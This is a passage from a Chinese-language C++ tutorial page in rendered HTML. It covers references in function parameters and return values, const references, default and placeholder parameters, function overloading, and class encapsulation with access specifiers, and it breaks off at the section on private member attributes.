<h3 id="2-3-引用做函数参数"><a href="#2-3-引用做函数参数" class="headerlink" title="2.3 引用做函数参数"></a>2.3 引用做函数参数</h3><p><strong>作用：</strong>函数传参时，可以利用引用的技术让形参修饰实参</p>
<p><strong>优点：</strong>可以简化指针修改实参</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 值传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap01</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 地址传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap02</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = *a;</span><br><span class="line">	*a = *b;</span><br><span class="line">	*b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//3. 引用传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap03</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mySwap01</span>(a, b);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mySwap02</span>(&amp;a, &amp;b);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mySwap03</span>(a, b);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：通过引用参数产生的效果同按地址传递是一样的。引用的语法更清楚简单</p>
</blockquote>
<h3 id="2-4-引用做函数返回值"><a href="#2-4-引用做函数返回值" class="headerlink" title="2.4 引用做函数返回值"></a>2.4 引用做函数返回值</h3><p>作用：引用是可以作为函数的返回值存在的</p>
<p>注意：<strong>不要返回局部变量引用</strong></p>
<p>用法：函数调用作为左值</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//返回局部变量引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>; <span class="comment">//局部变量</span></span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回静态变量引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> a = <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//不能返回局部变量的引用</span></span><br><span class="line">	<span class="type">int</span>&amp; ref = <span class="built_in">test01</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果函数做左值，那么必须返回引用</span></span><br><span class="line">	<span class="type">int</span>&amp; ref2 = <span class="built_in">test02</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>() = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p>​	</p>
<h3 id="2-5-引用的本质"><a href="#2-5-引用的本质" class="headerlink" title="2.5 引用的本质"></a>2.5 引用的本质</h3><p>本质：<strong>引用的本质在c++内部实现是一个指针常量.</strong></p>
<p>讲解示例：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发现是引用，转换为 int* const ref = &amp;a;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span>&amp; ref)</span></span>&#123;</span><br><span class="line">	ref = <span class="number">100</span>; <span class="comment">// ref是引用，转换为*ref = 100</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//自动转换为 int* const ref = &amp;a; 指针常量是指针指向不可改，也说明为什么引用不可更改</span></span><br><span class="line">	<span class="type">int</span>&amp; ref = a; </span><br><span class="line">	ref = <span class="number">20</span>; <span class="comment">//内部发现ref是引用，自动帮我们转换为: *ref = 20;</span></span><br><span class="line">    </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref:&quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">func</span>(a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>结论：C++推荐用引用技术，因为语法方便，引用本质是指针常量，但是所有的指针操作编译器都帮我们做了</p>
<h3 id="2-6-常量引用"><a href="#2-6-常量引用" class="headerlink" title="2.6 常量引用"></a>2.6 常量引用</h3><p><strong>作用：</strong>常量引用主要用来修饰形参，防止误操作</p>
<p>在函数形参列表中，可以加&#x3D;&#x3D;const修饰形参&#x3D;&#x3D;，防止形参改变实参</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引用使用的场景，通常用来修饰形参</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showValue</span><span class="params">(<span class="type">const</span> <span class="type">int</span>&amp; v)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//v += 10;</span></span><br><span class="line">	cout &lt;&lt; v &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//int&amp; ref = 10;  引用本身需要一个合法的内存空间，因此这行错误</span></span><br><span class="line">	<span class="comment">//加入const就可以了，编译器优化代码，int temp = 10; const int&amp; ref = temp;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>&amp; ref = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ref = 100;  //加入const后不可以修改变量</span></span><br><span class="line">	cout &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//函数中利用常量引用防止误操作修改实参</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="built_in">showValue</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h2 id="3-函数提高"><a href="#3-函数提高" class="headerlink" title="3 函数提高"></a>3 函数提高</h2><h3 id="3-1-函数默认参数"><a href="#3-1-函数默认参数" class="headerlink" title="3.1 函数默认参数"></a>3.1 函数默认参数</h3><p>在C++中，函数的形参列表中的形参是可以有默认值的。</p>
<p>语法：<code> 返回值类型  函数名 （参数= 默认值）&#123;&#125;</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>, <span class="type">int</span> c = <span class="number">10</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1. 如果某个位置参数有默认值，那么从这个位置往后，从左向右，必须都要有默认值</span></span><br><span class="line"><span class="comment">//2. 如果函数声明有默认值，函数实现的时候就不能有默认参数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a = <span class="number">10</span>, <span class="type">int</span> b = <span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; <span class="built_in">func</span>(<span class="number">20</span>, <span class="number">20</span>) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; <span class="built_in">func</span>(<span class="number">100</span>) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h3 id="3-2-函数占位参数"><a href="#3-2-函数占位参数" class="headerlink" title="3.2 函数占位参数"></a>3.2 函数占位参数</h3><p>C++中函数的形参列表里可以有占位参数，用来做占位，调用函数时必须填补该位置</p>
<p><strong>语法：</strong> <code>返回值类型 函数名 (数据类型)&#123;&#125;</code></p>
<p>在现阶段函数的占位参数存在意义不大，但是后面的课程中会用到该技术</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数占位参数 ，占位参数也可以有默认参数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span>)</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;this is func&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>,<span class="number">10</span>); <span class="comment">//占位参数必须填补</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>









<h3 id="3-3-函数重载"><a href="#3-3-函数重载" class="headerlink" title="3.3 函数重载"></a>3.3 函数重载</h3><h4 id="3-3-1-函数重载概述"><a href="#3-3-1-函数重载概述" class="headerlink" title="3.3.1 函数重载概述"></a>3.3.1 函数重载概述</h4><p><strong>作用：</strong>函数名可以相同，提高复用性</p>
<p><strong>函数重载满足条件：</strong></p>
<ul>
<li>同一个作用域下</li>
<li>函数名称相同</li>
<li>函数参数<strong>类型不同</strong>  或者 <strong>个数不同</strong> 或者 <strong>顺序不同</strong></li>
</ul>
<p><strong>注意:</strong>  函数的返回值不可以作为函数重载的条件</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数重载需要函数都在同一个作用域下</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">double</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (double a)的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a ,<span class="type">double</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a ,double b) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">double</span> a ,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (double a ,int b)的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数返回值不可以作为函数重载条件</span></span><br><span class="line"><span class="comment">//int func(double a, int b)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	cout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">func</span>();</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">3.14</span>);</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>,<span class="number">3.14</span>);</span><br><span class="line">	<span class="built_in">func</span>(<span class="number">3.14</span> , <span class="number">10</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>













<h4 id="3-3-2-函数重载注意事项"><a href="#3-3-2-函数重载注意事项" class="headerlink" title="3.3.2 函数重载注意事项"></a>3.3.2 函数重载注意事项</h4><ul>
<li>引用作为重载条件</li>
<li>函数重载碰到函数默认参数</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数重载注意事项</span></span><br><span class="line"><span class="comment">//1、引用作为重载条件</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int &amp;a) 调用 &quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (const int &amp;a) 调用 &quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、函数重载碰到函数默认参数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func2(int a, int b = 10) 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func2(int a) 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="built_in">func</span>(a); <span class="comment">//调用无const</span></span><br><span class="line">	<span class="built_in">func</span>(<span class="number">10</span>);<span class="comment">//调用有const</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//func2(10); //碰到默认参数产生歧义，需要避免</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h2 id="4-类和对象"><a href="#4-类和对象" class="headerlink" title="4 类和对象"></a><strong>4</strong> 类和对象</h2><p>C++面向对象的三大特性为：&#x3D;&#x3D;封装、继承、多态&#x3D;&#x3D;</p>
<p>C++认为&#x3D;&#x3D;万事万物都皆为对象&#x3D;&#x3D;，对象上有其属性和行为</p>
<p><strong>例如：</strong></p>
<p>​	人可以作为对象，属性有姓名、年龄、身高、体重…，行为有走、跑、跳、吃饭、唱歌…</p>
<p>​	车也可以作为对象，属性有轮胎、方向盘、车灯…,行为有载人、放音乐、放空调…</p>
<p>​	具有相同性质的&#x3D;&#x3D;对象&#x3D;&#x3D;，我们可以抽象称为&#x3D;&#x3D;类&#x3D;&#x3D;，人属于人类，车属于车类</p>
<h3 id="4-1-封装"><a href="#4-1-封装" class="headerlink" title="4.1 封装"></a>4.1 封装</h3><h4 id="4-1-1-封装的意义"><a href="#4-1-1-封装的意义" class="headerlink" title="4.1.1  封装的意义"></a>4.1.1  封装的意义</h4><p>封装是C++面向对象三大特性之一</p>
<p>封装的意义：</p>
<ul>
<li>将属性和行为作为一个整体，表现生活中的事物</li>
<li>将属性和行为加以权限控制</li>
</ul>
<p><strong>封装意义一：</strong></p>
<p>​	在设计类的时候，属性和行为写在一起，表现事物</p>
<p><strong>语法：</strong> <code>class 类名&#123;   访问权限： 属性  / 行为  &#125;;</code></p>
<p><strong>示例1：</strong>设计一个圆类，求圆的周长</p>
<p><strong>示例代码：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//圆周率</span></span><br><span class="line"><span class="type">const</span> <span class="type">double</span> PI = <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1、封装的意义</span></span><br><span class="line"><span class="comment">//将属性和行为作为一个整体，用来表现生活中的事物</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//封装一个圆类，求圆的周长</span></span><br><span class="line"><span class="comment">//class代表设计一个类，后面跟着的是类名</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:  <span class="comment">//访问权限  公共的权限</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//属性</span></span><br><span class="line">	<span class="type">int</span> m_r;<span class="comment">//半径</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//行为</span></span><br><span class="line">	<span class="comment">//获取到圆的周长</span></span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateZC</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//2 * pi  * r</span></span><br><span class="line">		<span class="comment">//获取圆的周长</span></span><br><span class="line">		<span class="keyword">return</span>  <span class="number">2</span> * PI * m_r;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//通过圆类，创建圆的对象</span></span><br><span class="line">	<span class="comment">// c1就是一个具体的圆</span></span><br><span class="line">	Circle c1;</span><br><span class="line">	c<span class="number">1.</span>m_r = <span class="number">10</span>; <span class="comment">//给圆对象的半径 进行赋值操作</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2 * pi * 10 = = 62.8</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;圆的周长为： &quot;</span> &lt;&lt; c<span class="number">1.</span><span class="built_in">calculateZC</span>() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<p><strong>示例2：</strong>设计一个学生类，属性有姓名和学号，可以给姓名和学号赋值，可以显示学生的姓名和学号</p>
<p><strong>示例2代码：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//学生类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(string name)</span> </span>&#123;</span><br><span class="line">		m_name = name;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">setID</span><span class="params">(<span class="type">int</span> id)</span> </span>&#123;</span><br><span class="line">		m_id = id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showStudent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;name:&quot;</span> &lt;&lt; m_name &lt;&lt; <span class="string">&quot; ID:&quot;</span> &lt;&lt; m_id &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_name;</span><br><span class="line">	<span class="type">int</span> m_id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Student stu;</span><br><span class="line">	stu.<span class="built_in">setName</span>(<span class="string">&quot;德玛西亚&quot;</span>);</span><br><span class="line">	stu.<span class="built_in">setID</span>(<span class="number">250</span>);</span><br><span class="line">	stu.<span class="built_in">showStudent</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>









<p><strong>封装意义二：</strong></p>
<p>类在设计时，可以把属性和行为放在不同的权限下，加以控制</p>
<p>访问权限有三种：</p>
<ol>
<li>public        公共权限  </li>
<li>protected 保护权限</li>
<li>private      私有权限</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//三种权限</span></span><br><span class="line"><span class="comment">//公共权限  public     类内可以访问  类外可以访问</span></span><br><span class="line"><span class="comment">//保护权限  protected  类内可以访问  类外不可以访问</span></span><br><span class="line"><span class="comment">//私有权限  private    类内可以访问  类外不可以访问</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//姓名  公共权限</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	string m_Name;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//汽车  保护权限</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	string m_Car;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//银行卡密码  私有权限</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_Password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		m_Name = <span class="string">&quot;张三&quot;</span>;</span><br><span class="line">		m_Car = <span class="string">&quot;拖拉机&quot;</span>;</span><br><span class="line">		m_Password = <span class="number">123456</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Person p;</span><br><span class="line">	p.m_Name = <span class="string">&quot;李四&quot;</span>;</span><br><span class="line">	<span class="comment">//p.m_Car = &quot;奔驰&quot;;  //保护权限类外访问不到</span></span><br><span class="line">	<span class="comment">//p.m_Password = 123; //私有权限类外访问不到</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<h4 id="4-1-2-struct和class区别"><a href="#4-1-2-struct和class区别" class="headerlink" title="4.1.2 struct和class区别"></a>4.1.2 struct和class区别</h4><p>在C++中 struct和class唯一的<strong>区别</strong>就在于 <strong>默认的访问权限不同</strong></p>
<p>区别：</p>
<ul>
<li>struct 默认权限为公共</li>
<li>class   默认权限为私有</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">C1</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span>  m_A; <span class="comment">//默认是私有权限</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">C2</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> m_A;  <span class="comment">//默认是公共权限</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	C1 c1;</span><br><span class="line">	c<span class="number">1.</span>m_A = <span class="number">10</span>; <span class="comment">//错误，访问权限是私有</span></span><br><span class="line"></span><br><span class="line">	C2 c2;</span><br><span class="line">	c<span class="number">2.</span>m_A = <span class="number">10</span>; <span class="comment">//正确，访问权限是公共</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>













<h4 id="4-1-3-成员属性设置为私有"><a href="#4-1-3-成员属性设置为私有" class="headerlink" title="4.1.3 成员属性设置为私有"></a>4.1.3 成员属性设置为私有</h4><p><strong>优点1：</strong>将所有成员属性设置为私有，可以自己控制读写权限</p>
<p><strong>优点2：</strong>对于写权限，我们可以检测数据的有效性</p>
<p><strong>示例：</strong></p>
